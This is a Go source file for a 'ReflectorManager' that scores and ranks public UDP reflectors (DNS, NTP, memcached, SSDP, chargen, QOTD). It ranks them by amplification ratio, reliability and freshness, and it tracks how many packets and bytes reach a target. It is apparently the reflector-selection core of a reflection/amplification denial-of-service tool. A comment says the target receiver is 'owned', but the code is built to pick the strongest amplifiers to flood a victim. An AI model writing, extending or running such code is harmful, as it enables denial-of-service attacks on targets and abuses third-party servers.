package main

import (
	"fmt"
	"net"
	"sort"
	"sync"
	"time"
)

// ObservationSource separates local UDP handoff telemetry from actual
// reflector/probe telemetry and target-side impact telemetry.
type ObservationSource uint8

const (
	ObsLocalSend ObservationSource = iota
	ObsProbeReply
	ObsTargetCollector
)

// CandidateState tracks the managed lifecycle of a reflector candidate.
type CandidateState uint8

const (
	StateUnknown CandidateState = iota
	StateHealthy
	StateDegraded
	StateCooldown
	StateDead
)

// reflectorCandidate models the minimal telemetry needed to score a public UDP
// reflector: how big its replies look, how reliable it has been, and whether
// it has already started decaying under load.
type reflectorCandidate struct {
	IP                    net.IP
	Protocol              string
	Port                  uint16
	RequestBytes          int
	LastResponseBytes     int
	ResponseEWMA          float64
	ReliabilityEWMA       float64
	LatencyEWMA           float64
	ResponseBytes         int
	SuccessCount          int
	FailureCount          int
	LocalSendSuccessCount int
	LocalSendFailureCount int
	ProbeSuccesses        uint64
	ProbeFailures         uint64
	TargetPackets         uint64
	TargetBytes           uint64
	ConsecutiveFailures   int
	Dead                  bool
	LastSeen              time.Time
	LastProbe             time.Time
	LastSuccess           time.Time
	CooldownUntil         time.Time
	State                 CandidateState
	LastError             string
}

type reflectorObservation struct {
	Source ObservationSource

	IP            net.IP
	Protocol      string
	Port          uint16
	RequestBytes  int
	ResponseBytes int
	Latency       time.Duration
	TargetPackets uint64
	TargetBytes   uint64
	Err           error
	At            time.Time
}

type ReflectorManager struct {
	mu sync.RWMutex

	byKey map[string]*reflectorCandidate

	ranked   map[string][]*reflectorCandidate
	dirty    map[string]bool
	rankedAt map[string]time.Time

	cooldown time.Duration
	ttl      time.Duration
}

func NewReflectorManager() *ReflectorManager {
	return &ReflectorManager{
		byKey:    make(map[string]*reflectorCandidate),
		ranked:   make(map[string][]*reflectorCandidate),
		dirty:    make(map[string]bool),
		rankedAt: make(map[string]time.Time),
		cooldown: 2 * time.Minute,
		ttl:      30 * time.Minute,
	}
}

func reflectorKey(protocol string, ip net.IP) string {
	if ip == nil {
		return ""
	}
	return protocol + "|" + ip.String()
}

var reflectorManager = NewReflectorManager()

func scoreReflectorCandidate(c reflectorCandidate) float64 {
	if c.Dead {
		return -1
	}

	reliability := 0.0
	attempts := c.SuccessCount + c.FailureCount
	if attempts > 0 {
		reliability = float64(c.SuccessCount) / float64(attempts)
	}

	amplification := float64(c.ResponseBytes) / 64.0
	if amplification > 64 {
		amplification = 64
	}

	freshness := 1.0
	if !c.LastSeen.IsZero() {
		age := time.Since(c.LastSeen)
		switch {
		case age < 30*time.Second:
			freshness = 1.0
		case age < 2*time.Minute:
			freshness = 0.85
		case age < 5*time.Minute:
			freshness = 0.60
		default:
			freshness = 0.35
		}
	}

	stalePenalty := 0.0
	if !c.LastSeen.IsZero() {
		age := time.Since(c.LastSeen)
		switch {
		case age > 10*time.Minute:
			stalePenalty += 40
		case age > 5*time.Minute:
			stalePenalty += 20
		case age > 2*time.Minute:
			stalePenalty += 8
		}
	}

	consecutivePenalty := float64(c.ConsecutiveFailures) * 6.0
	recentBalance := float64(c.SuccessCount)*1.5 - float64(c.FailureCount)*4.0

	// Favor measured response size, recent probe quality, and freshness over
	// old lifetime totals that can keep stale reflectors artificially warm.
	return amplification*0.35 + reliability*80.0 + freshness*12.0 + recentBalance - consecutivePenalty - stalePenalty
}

func selectReflectorCandidate(candidates []reflectorCandidate) reflectorCandidate {
	if len(candidates) == 0 {
		return reflectorCandidate{}
	}

	healthy := make([]reflectorCandidate, 0, len(candidates))
	for _, candidate := range candidates {
		if !candidate.Dead {
			healthy = append(healthy, candidate)
		}
	}
	if len(healthy) == 0 {
		healthy = candidates
	}

	sort.SliceStable(healthy, func(i, j int) bool {
		left := scoreReflectorCandidate(healthy[i])
		right := scoreReflectorCandidate(healthy[j])
		if left == right {
			return healthy[i].ResponseBytes > healthy[j].ResponseBytes
		}
		return left > right
	})

	return healthy[0]
}

func recordReflectorObservation(ip net.IP, protocol string, success bool, requestBytes, responseBytes int, errText string, measured bool) {
	if ip == nil {
		return
	}

	source := ObsProbeReply
	if !measured {
		source = ObsLocalSend
	}

	if !success && errText == "" {
		if measured {
			errText = "probe returned no measurable reply"
		} else {
			errText = "local UDP handoff failed"
		}
	}

	reflectorManager.Record(reflectorObservation{
		Source:        source,
		IP:            ip,
		Protocol:      protocol,
		RequestBytes:  requestBytes,
		ResponseBytes: responseBytes,
		Err:           errStringFromText(errText),
		At:            time.Now(),
	})
}

func errStringFromText(text string) error {
	if text == "" {
		return nil
	}
	return fmt.Errorf("%s", text)
}

func getReflectorTelemetry(ip net.IP, protocol string) reflectorCandidate {
	if ip == nil {
		return reflectorCandidate{}
	}
	key := reflectorKey(protocol, ip)
	reflectorManager.mu.RLock()
	defer reflectorManager.mu.RUnlock()
	if c := reflectorManager.byKey[key]; c != nil {
		return *c
	}
	return reflectorCandidate{}
}

func invalidateReflectorRankCache(protocol string) {
	reflectorManager.mu.Lock()
	delete(reflectorManager.ranked, protocol)
	delete(reflectorManager.rankedAt, protocol)
	reflectorManager.mu.Unlock()
}

func defaultReflectorResponseBytes(protocol string) int {
	switch protocol {
	case "dns":
		return 512
	case "ntp":
		return 1024
	case "memcached":
		return 4096
	case "ssdp":
		return 2048
	case "chargen", "qotd":
		return 1024
	default:
		return 256
	}
}

func pickReflectorIP(amplifiers []net.IP, protocol string) net.IP {
	if len(amplifiers) == 0 {
		return nil
	}
	ip, ok := reflectorManager.Select(protocol)
	if ok && ip != nil {
		return ip
	}
	return nil
}

// recordTargetCollectorEvidence feeds the manager with aggregate target-side
// traffic counts from a live owned receiver. this is honest evidence of what
// reached the target during the current run, even though the receiver stats are
// aggregate rather than per-reflector attribution.
func recordTargetCollectorEvidence(targetPackets, targetBytes uint64) {
	if targetPackets == 0 && targetBytes == 0 {
		return
	}

	reflectorManager.mu.RLock()
	entries := make([]reflectorCandidate, 0, len(reflectorManager.byKey))
	for _, c := range reflectorManager.byKey {
		if c == nil || c.IP == nil {
			continue
		}
		entries = append(entries, *c)
	}
	reflectorManager.mu.RUnlock()

	for _, c := range entries {
		reflectorManager.Record(reflectorObservation{
			Source:        ObsTargetCollector,
			IP:            append(net.IP(nil), c.IP...),
			Protocol:      c.Protocol,
			TargetPackets: targetPackets,
			TargetBytes:   targetBytes,
			At:            time.Now(),
		})
	}
}

func (m *ReflectorManager) Record(obs reflectorObservation) {
	if obs.IP == nil {
		return
	}
	if obs.At.IsZero() {
		obs.At = time.Now()
	}

	key := reflectorKey(obs.Protocol, obs.IP)
	m.mu.Lock()
	defer m.mu.Unlock()

	m.pruneExpiredLocked(obs.At)

	c := m.byKey[key]
	if c == nil {
		c = &reflectorCandidate{IP: append(net.IP(nil), obs.IP...), Protocol: obs.Protocol, Port: obs.Port, State: StateUnknown}
		m.byKey[key] = c
	}

	c.LastSeen = obs.At
	if obs.RequestBytes > 0 {
		c.RequestBytes = obs.RequestBytes
	}

	switch obs.Source {
	case ObsLocalSend:
		m.recordLocalSend(c, obs)
	case ObsProbeReply:
		m.recordProbeReply(c, obs)
	case ObsTargetCollector:
		m.recordTargetCollector(c, obs)
	}

	m.dirty[obs.Protocol] = true
}

func (m *ReflectorManager) recordLocalSend(c *reflectorCandidate, obs reflectorObservation) {
	if obs.Err != nil {
		c.LocalSendFailureCount++
		c.LastError = obs.Err.Error()
		return
	}
	c.LocalSendSuccessCount++
	c.LastError = ""
}

func (m *ReflectorManager) recordProbeReply(c *reflectorCandidate, obs reflectorObservation) {
	c.LastProbe = obs.At
	if obs.Err != nil || obs.ResponseBytes <= 0 {
		c.ProbeFailures++
		c.FailureCount++
		c.ConsecutiveFailures++
		c.LastError = errString(obs.Err)
		if c.ConsecutiveFailures >= 3 {
			c.State = StateCooldown
			c.CooldownUntil = obs.At.Add(m.cooldown)
		} else {
			c.State = StateDegraded
		}
		return
	}

	c.ProbeSuccesses++
	c.SuccessCount++
	c.LastSuccess = obs.At
	c.ConsecutiveFailures = 0
	c.ResponseBytes = obs.ResponseBytes
	c.LastResponseBytes = obs.ResponseBytes
	if c.ResponseEWMA == 0 {
		c.ResponseEWMA = float64(obs.ResponseBytes)
	} else {
		c.ResponseEWMA = ewma(c.ResponseEWMA, float64(obs.ResponseBytes), 0.35, true)
	}
	c.ReliabilityEWMA = ewma(c.ReliabilityEWMA, 1.0, 0.25, c.ProbeSuccesses+c.ProbeFailures > 1)
	if obs.Latency > 0 {
		c.LatencyEWMA = ewma(c.LatencyEWMA, float64(obs.Latency.Milliseconds()), 0.25, c.ProbeSuccesses > 1)
	}
	c.State = StateHealthy
	c.LastError = ""
}

func (m *ReflectorManager) recordTargetCollector(c *reflectorCandidate, obs reflectorObservation) {
	if obs.Err != nil {
		c.LastError = errString(obs.Err)
		return
	}
	if obs.TargetPackets == 0 && obs.TargetBytes == 0 {
		return
	}
	c.TargetPackets += obs.TargetPackets
	c.TargetBytes += obs.TargetBytes
	if obs.ResponseBytes > 0 {
		c.ResponseBytes = obs.ResponseBytes
		c.LastResponseBytes = obs.ResponseBytes
	}
	c.LastSuccess = obs.At
	c.ConsecutiveFailures = 0
	c.State = StateHealthy
	c.LastError = ""
}

func ewma(prev, next, alpha float64, initialized bool) float64 {
	if !initialized {
		return next
	}
	return alpha*next + (1-alpha)*prev
}

func errString(err error) string {
	if err == nil {
		return ""
	}
	return err.Error()
}

func (m *ReflectorManager) Select(protocol string) (net.IP, bool) {
	now := time.Now()
	m.mu.Lock()
	defer m.mu.Unlock()

	m.pruneExpiredLocked(now)
	if m.dirty[protocol] || now.Sub(m.rankedAt[protocol]) > 5*time.Second {
		m.rebuildRankingLocked(protocol, now)
	}

	list := m.ranked[protocol]
	if len(list) == 0 {
		return nil, false
	}
	best := list[0]
	if best == nil || best.IP == nil {
		return nil, false
	}
	return append(net.IP(nil), best.IP...), true
}

func (m *ReflectorManager) PruneExpired(now time.Time) int {
	m.mu.Lock()
	defer m.mu.Unlock()
	return m.pruneExpiredLocked(now)
}

func (m *ReflectorManager) pruneExpiredLocked(now time.Time) int {
	if m.ttl <= 0 {
		return 0
	}

	pruned := 0
	for key, c := range m.byKey {
		if c == nil || c.IP == nil {
			delete(m.byKey, key)
			pruned++
			continue
		}
		if c.LastSeen.IsZero() {
			continue
		}
		if now.Sub(c.LastSeen) <= m.ttl {
			continue
		}
		delete(m.byKey, key)
		pruned++
	}
	if pruned > 0 {
		for protocol := range m.ranked {
			delete(m.ranked, protocol)
			delete(m.rankedAt, protocol)
			m.dirty[protocol] = true
		}
	}
	return pruned
}

func (m *ReflectorManager) Summary(protocol string) (verified int, requestBytes, responseBytes uint64) {
	now := time.Now()
	m.mu.RLock()
	defer m.mu.RUnlock()

	for _, c := range m.byKey {
		if c == nil {
			continue
		}
		if protocol != "" && c.Protocol != protocol {
			continue
		}
		if m.ttl > 0 && !c.LastSeen.IsZero() && now.Sub(c.LastSeen) > m.ttl {
			continue
		}
		if c.ProbeSuccesses > 0 || c.SuccessCount > 0 || c.TargetPackets > 0 || c.TargetBytes > 0 {
			verified++
			requestBytes += uint64(c.RequestBytes)
			if c.LastResponseBytes > 0 {
				responseBytes += uint64(c.LastResponseBytes)
			} else {
				responseBytes += uint64(c.ResponseBytes)
			}
		}
	}
	return verified, requestBytes, responseBytes
}

func (m *ReflectorManager) VerifiedCandidates(protocol string) []reflectorCandidate {
	now := time.Now()
	m.mu.RLock()
	defer m.mu.RUnlock()

	out := make([]reflectorCandidate, 0)
	for _, c := range m.byKey {
		if c == nil || c.Protocol != protocol {
			continue
		}
		if m.ttl > 0 && !c.LastSeen.IsZero() && now.Sub(c.LastSeen) > m.ttl {
			continue
		}
		if c.ProbeSuccesses > 0 || c.SuccessCount > 0 || c.TargetPackets > 0 || c.TargetBytes > 0 {
			out = append(out, *c)
		}
	}
	sort.SliceStable(out, func(i, j int) bool {
		if out[i].LastResponseBytes == out[j].LastResponseBytes {
			return out[i].LastSeen.After(out[j].LastSeen)
		}
		return out[i].LastResponseBytes > out[j].LastResponseBytes
	})
	return out
}

func (m *ReflectorManager) rebuildRankingLocked(protocol string, now time.Time) {
	list := make([]*reflectorCandidate, 0)
	for _, c := range m.byKey {
		if c.Protocol != protocol {
			continue
		}
		score := scoreCandidate(c, now)
		if score < 0 {
			continue
		}
		list = append(list, c)
	}

	sort.SliceStable(list, func(i, j int) bool {
		left := scoreCandidate(list[i], now)
		right := scoreCandidate(list[j], now)
		if left == right {
			return list[i].LastResponseBytes > list[j].LastResponseBytes
		}
		return left > right
	})

	if len(list) > 16 {
		list = list[:16]
	}
	m.ranked[protocol] = list
	m.rankedAt[protocol] = now
	m.dirty[protocol] = false
}

func scoreCandidate(c *reflectorCandidate, now time.Time) float64 {
	if c == nil || c.IP == nil {
		return -1
	}
	if c.State == StateDead {
		return -1
	}
	if c.State == StateCooldown && now.Before(c.CooldownUntil) {
		return -1
	}
	if !c.LastSuccess.IsZero() && now.Sub(c.LastSuccess) > 30*time.Minute {
		return -1
	}

	ampRatio := float64(c.LastResponseBytes) / 64.0
	if ampRatio > 64 {
		ampRatio = 64
	}
	if ampRatio < 0 {
		ampRatio = 0
	}

	reliability := c.ReliabilityEWMA
	if reliability <= 0 {
		reliability = 0.5
	}
	if reliability > 1 {
		reliability = 1
	}

	freshness := 0.0
	if !c.LastSuccess.IsZero() {
		age := now.Sub(c.LastSuccess)
		switch {
		case age < 30*time.Second:
			freshness = 12
		case age < 2*time.Minute:
			freshness = 8
		case age < 10*time.Minute:
			freshness = 3
		default:
			freshness = 0
		}
	}

	latencyPenalty := 0.0
	if c.LatencyEWMA > 0 {
		latencyPenalty = c.LatencyEWMA / 100.0
		if latencyPenalty > 10 {
			latencyPenalty = 10
		}
	}
	failurePenalty := float64(c.ConsecutiveFailures) * 15.0
	targetBonus := 0.0
	if c.TargetPackets > 0 || c.TargetBytes > 0 {
		targetBonus = 20.0
	}

	return reliability*60.0 + ampRatio*0.4 + freshness + targetBonus - latencyPenalty - failurePenalty
}

func (m *ReflectorManager) Reset() {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.byKey = make(map[string]*reflectorCandidate)
	m.ranked = make(map[string][]*reflectorCandidate)
	m.dirty = make(map[string]bool)
	m.rankedAt = make(map[string]time.Time)
}
